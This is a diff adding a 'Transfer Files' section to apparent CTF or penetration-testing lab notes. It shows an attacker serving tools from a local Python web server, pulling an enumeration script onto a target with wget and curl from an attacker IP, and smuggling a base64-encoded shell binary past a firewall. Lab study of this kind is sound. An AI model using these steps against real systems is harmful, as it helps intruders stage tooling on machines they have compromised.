@@ -349,3 +349,32 @@ chmod 600 root_key
 ssh -i root_key root@<IP>
 ```
 boom flag.
+# Transfer Files
+Many labs will require tools to be transfered to the host, or they require content to be moved off the host, in these cases the following methods work 
+**Wget or Curl**
+First host the file on a local python web sever on local host, cd to dir where tools are located.
+```bash 
+python3 -m http.server 8000
+```
+Now the source host is listening on 8000 and will server files we can call to it from our target host.
+**wget**
+```bash
+wget http://10.10.14.1:8000/linenum.sh
+```
+**curl**
+```bash
+curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
+```
+**SCP**
+```bash
+scp linenum.sh user@remotehost:/tmp/linenum.sh
+```
+Sometimes because of a firewall you cannot use the standard methods to pull a script onto the host. To achieve this you can coppy the script into a base64 
+Local Host
+```bash
+base64 shell -w 0
+```
+Remote Host
+```bash
+echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
+```
